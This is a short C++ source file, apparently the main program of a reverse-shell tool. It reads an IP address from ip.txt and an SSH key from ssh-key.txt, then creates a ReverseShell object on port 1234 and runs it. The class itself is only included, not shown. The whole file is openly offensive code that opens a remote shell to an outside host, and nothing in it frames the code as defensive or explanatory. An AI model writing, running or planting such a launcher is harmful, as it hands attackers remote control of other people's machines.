#include "ReverseShell.h"
#include <iostream>
#include <fstream>
#include <string>

int main() {
    std::ifstream ip_file("ip.txt");
    std::string ip;
    if (ip_file.is_open()) {
        std::getline(ip_file, ip);
        ip_file.close();
    } else {
        std::cerr << "Unable to open ip.txt\n";
        return 1;
    }

    std::ifstream ssh_key_file("ssh-key.txt");
    std::string ssh_key;
    if (ssh_key_file.is_open()) {
        std::getline(ssh_key_file, ssh_key);
        ssh_key_file.close();
    } else {
        std::cerr << "Unable to open ssh-key.txt\n";
        return 1;
    }

    ReverseShell shell(ip, 1234, ssh_key);
    shell.run();

    return 0;
}
